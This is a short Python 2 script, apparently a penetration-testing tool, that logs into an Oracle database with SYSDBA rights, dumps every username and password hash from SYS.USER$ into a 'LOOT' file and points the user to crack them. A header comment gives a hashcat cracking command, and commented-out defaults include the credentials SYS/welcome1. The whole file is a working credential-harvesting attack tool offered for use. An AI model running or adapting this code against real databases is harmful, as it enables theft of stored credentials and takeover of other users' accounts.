#!/usr/bin/python
#getHashes prototype
#Author: Liam Romanis
#hashcat -m 12300 LOOT-192.168.1.175-1521-ORCL-SYS.txt 10k_most_common.txt 

import cx_Oracle
import sys, getopt, os
from array import *
import re
import time
from subprocess import call

def getHashes(myip,myport,mysid,myuser):
	uid, passwd = re.split(':',myuser)
	#uid="SYS"
	#passwd="welcome1"
	lootName = "LOOT-%s-%s-%s-%s.txt" % (myip, myport, mysid, uid)
	lootfile = open(lootName, 'w')
	print "Dumping usernames and passwords with DBA account"
	dsnStr = cx_Oracle.makedsn(myip, myport, mysid)
       	con = cx_Oracle.connect(user=uid, password=passwd, dsn=dsnStr, mode=cx_Oracle.SYSDBA)
	plsqlquery = "select name, password from SYS.USER$"
	curs = con.cursor()
	time.sleep(1)	
	curs.execute(plsqlquery)
	for row in curs.fetchall():
		result = "%s" % str(row)
		username, pwdhash = re.split(',', str(result))
		usernameF = username.replace('\'', '')[1:-1]
		pwdhashF = pwdhash.replace('\'', '')[1:-1]
       		print ("%s:%s" % (str(usernameF), str(pwdhashF)))
		if "None" in str(pwdhashF):
			lootfile.write("%s:\n" % (str(usernameF)))
		else:
			lootfile.write("%s:%s\n" % (str(usernameF), str(pwdhashF)))
	curs.close()
	con.close()
	lootfile.close()
	print "LOOT file %s has been generated" % lootName
	print "You may now crack the hashes with an appropriate tool"
	

#if __name__ == "__main__":
#	ip = "192.168.1.175"
#	port = "1521"
#	sid = "ORCL"	
#	getHashes(ip,port,sid)		

